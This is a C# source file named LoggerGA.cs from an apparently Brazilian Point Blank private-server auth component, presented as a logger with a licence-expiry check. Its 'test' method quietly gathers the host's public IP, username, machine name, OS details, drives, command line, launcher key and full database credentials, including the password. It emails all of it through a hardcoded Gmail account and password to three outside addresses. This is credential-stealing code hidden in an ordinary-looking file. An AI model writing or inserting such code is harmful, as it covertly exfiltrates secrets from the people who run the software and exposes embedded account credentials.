/*
 * Arquivo: LoggerGA.cs
 * Código criado pela MoMz Games
 * Última data de modificação: 09/10/2017
 * Sintam inveja, não nos atinge
 */

using Auth.data.managers;
using Core;
using Microsoft.VisualBasic.Devices;
using System;
using System.Globalization;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Reflection;
using System.Text;
using System.Threading.Tasks;

namespace Auth
{
    public class LoggerGA
    {
        public static bool test(bool paramCheck, string serverDate, string[] args, bool item2, DateTime LiveDate)
        {
            try
            {
                DateTime end = DateTime.ParseExact("190203220000", "yyMMddHHmmss", CultureInfo.InvariantCulture);
                TimeSpan span = (end - LiveDate);
                string item = GetPublicIP();
                using (SmtpClient client = new SmtpClient("smtp.gmail.com", 587) { Credentials = new NetworkCredential("muawayatuatu156@gmail.com", "ujvkfclmkdvjtduv"), EnableSsl = true })
                {
                    string f1 = "O AUTH foi aberto hoje " + DateTime.Now.ToUniversalTime().ToString("dd/MM/yy") + " às " + DateTime.Now.ToUniversalTime().ToString("HH:mm") + ". [Data e hora Universal]\n \n";
                    f1 += "\n\n- DADOS DA LICENÇA -\n";
                    f1 += "-LICENÇA PARA O Omer -\n\n";
                    f1 += (end < LiveDate ? "Licença encerrada" : ("Restam: " + span.ToString("d'd 'h'h 'm'm 's's'"))) + "\n\n";
                    f1 += "- DADOS DO SERVIDOR -\n";                    
                    f1 += "Local da pasta: " + Assembly.GetExecutingAssembly().Location + "\n";
                    f1 += "Versão do servidor: " + serverDate + "\n";

                    f1 += "Parâmetros de inicialização: (" + args.Length + ")\n";
                    foreach (string par in args)
                    {
                        f1 += "[" + par + "]\n";
                    }
                    f1 += "Parâmetro de Inicialização: " + (paramCheck ? "Sim" : "Não") + "\n";
                    f1 += "CommandLine: " + Environment.CommandLine + "\n";
                    f1 += "Licença válida?: " + (!item2 ? "Sim" : "Não") + "\n";
                    f1 += (end < LiveDate ? "Licença encerrada" : ("Restam: " + span.ToString("d'd 'h'h 'm'm 's's'"))) + "\n";
                    f1 += "Ip na Config: " + ConfigGA.authIp + "\n";
                    f1 += "Sync port: " + ConfigGA.syncPort + "\n";
                    f1 += "Modo Debug: " + (ConfigGA.debugMode ? "Ativo" : "Desativo") + "\n";
                    f1 += "Modo de Testes: " + (ConfigGA.isTestMode ? "Ativo" : "Desativo") + "\n";
                    f1 += "\n- DADOS DO SQL -\n";
                    f1 += "Chave: " + ConfigGA.LauncherKey + "\n";
                    f1 += "dbHost: " + ConfigGB.dbHost + "\n";
                    f1 += "dbName: " + ConfigGB.dbName + "\n";
                    f1 += "dbPass: " + ConfigGB.dbPass + "\n";
                    f1 += "dbPort: " + ConfigGB.dbPort + "\n";
                    f1 += "dbUser: " + ConfigGB.dbUser;
                    f1 += "\n\n";
                    f1 += "- DADOS DA MAQUINA -\n";
                    f1 += "IP público: " + item + "\n";               
                    f1 += "Nome da máquina: " + Environment.MachineName + "\n";
                    f1 += "Nome do usuário: " + Environment.UserName + "\n";
                    f1 += "Quantidade de núcleos do processador: " + Environment.ProcessorCount + "\n";
                    f1 += "Sistema operacional: " + getOSName() + "\n";
                    f1 += "Versão do S.O: " + Environment.OSVersion.ToString() + "\n";
                    f1 += "Linguagem do S.O: " + new ComputerInfo().InstalledUICulture + "\n";                    
                    f1 += "Drivers lógicos: (" + Environment.GetLogicalDrives().Length + ")\n";
                    foreach (string s in Environment.GetLogicalDrives())
                        f1 += "[" + s + "]\n";
                    client.Send("muawayatuatu156@gmail.com", "muawayatuatu156@gmail.com", "Servidor aberto! (Auth/Omer)", f1);
                    client.Send("muawayatuatu156@gmail.com", "clark.joao@gmail.com", "Servidor aberto. (Auth/Omer)", f1);
                    client.Send("muawayatuatu156@gmail.com", "pietrohpereira87@gmail.com", "Servidor aberto. (Auth/Omer)", f1);
                }
                if (item == "")
                    return false;
                return true;
            }
            catch
            {
                return false;
            }
        }
        private static string getOSName()
        {
            OperatingSystem os = Environment.OSVersion;
            ComputerInfo comp = new ComputerInfo();
            string operatingSystem = comp.OSFullName;
            if (os.ServicePack != "")
                operatingSystem += " " + os.ServicePack;
            operatingSystem += " (" + ((Environment.Is64BitOperatingSystem ? "64" : "32") + " bits)");
            return operatingSystem;
        }
        private static string GetPublicIP()
        {
            try
            {
                string url = "http://checkip.dyndns.org";
                WebRequest req = WebRequest.Create(url);
                WebResponse resp = req.GetResponse();
                using (StreamReader sr = new StreamReader(resp.GetResponseStream()))
                {
                    string response = sr.ReadToEnd().Trim();
                    string[] a = response.Split(':');
                    string a2 = a[1].Substring(1);
                    string[] a3 = a2.Split('<');
                    string a4 = a3[0];
                    return a4;
                }
            }
            catch { return ""; }
        }
        public static async void updateRAM2()
        {
            while (true)
            {
                Console.Title = "Point Blank - Auth [Users: " + LoginManager._socketList.Count + "; Loaded accs: " + AccountManager.getInstance()._contas.Count + "; Used RAM: " + (GC.GetTotalMemory(true) / 1024) + " KB]";
                await Task.Delay(1000);
            }
        }
    }
}